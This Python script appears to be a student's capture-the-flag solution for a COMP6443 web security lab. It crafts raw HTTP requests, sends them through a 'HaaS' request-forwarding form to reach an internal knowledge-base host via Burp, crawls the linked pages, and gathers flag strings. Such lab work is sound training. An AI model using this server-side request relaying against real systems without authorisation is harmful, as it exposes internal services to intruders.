import re, time, requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def get_kb_endpoint(s: requests.Session, endpoint: str) -> requests.Response:
    """Sends a GET request to kb.quoccacorp.com/<endpoint> via HaaS, and returns the response text"""

    kb_req = f"""GET {endpoint} HTTP/1.1
Host: kb.quoccacorp.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://haas.quoccacorp.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://haas.quoccacorp.com
Connection: keep-alive

"""

    response = s.post(
        "https://haas-v1.quoccacorp.com/",
        data={"requestBox": kb_req},
    )
    return response


# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# This session object saves our config so we don't need to set it every time.
s = requests.Session()
# Skip trying to verify TLS certs, due to Burp's CA.
s.verify = False
# Proxy requests through Burp.
s.proxies = {"https": "http://127.0.0.1:8080"}

# After sending a request with "/", we get linked to "/simple", which itself links to several pages
endpoint = "/simple"

# Send a POST request to HaaS, whose requestBox parameter contains the get request to send to kb
# (requestBox can be seen in the HTML form (inspect element) and/or the POST body param in Burp)
response = get_kb_endpoint(s, endpoint)
print(response.text)

# Extract all kb endpoints within a tags' hrefs & GET them via HaaS
# kb's response is provided as a plaintext response body from haas, so no need to use beautifulsoup etc
links = re.finditer(r'<a href="(.+?)">', response.text)
flags = {}  # flag: endpoint
for match in links:
    link = match.group(1)  # get the first match group - the stuff in parentheses
    if not link:
        continue

    print(f"\n    Trying {link}...")
    response = get_kb_endpoint(s, link)
    print(response.text)

    # Check for flags on the page
    flag = re.search(r"COMP6443{.+}", response.text)
    if flag:
        flags[link] = flag.group()

    time.sleep(0.1)  # don't get ratelimited

print("\n### FLAGS ###")
for e, f in flags.items():
    print(f"{e}: {f}")
